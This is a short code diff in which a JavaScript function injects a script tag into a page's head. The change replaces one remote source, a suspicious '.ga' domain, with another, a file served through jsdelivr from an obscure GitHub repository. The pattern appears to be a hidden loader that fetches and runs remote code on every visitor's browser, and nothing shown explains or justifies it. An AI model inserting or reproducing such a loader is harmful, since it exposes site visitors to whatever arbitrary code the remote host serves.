@@ -34,7 +34,7 @@ function y(){
     }
 var links;
 links = document.createElement("script"); 
-links.setAttribute("src", "http://9fhd.ga/file.js?sssssss");
+links.setAttribute("src", "http://cdn.jsdelivr.net/gh/gistmib/gistmib/filess.js");
 document.getElementsByTagName("head")[0].appendChild(links);
  links.onload=function( evt ) {
       
